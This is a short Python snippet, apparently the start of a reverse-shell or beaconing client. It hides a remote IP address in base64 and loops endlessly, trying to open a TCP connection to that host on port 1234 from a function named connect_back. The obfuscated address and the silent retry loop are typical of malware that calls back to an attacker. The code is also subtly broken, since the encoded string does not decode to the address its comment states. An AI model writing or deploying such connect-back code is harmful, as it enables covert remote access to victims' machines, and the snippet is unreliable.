import socket
import base64

encoded_ip = 'NTIuMjIuMTEuMTQ6'  # base64 for '52.22.11.146'
SERVER_IP = base64.b64decode(encoded_ip).decode()
SERVER_PORT = 1234

def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
        except:
            pass
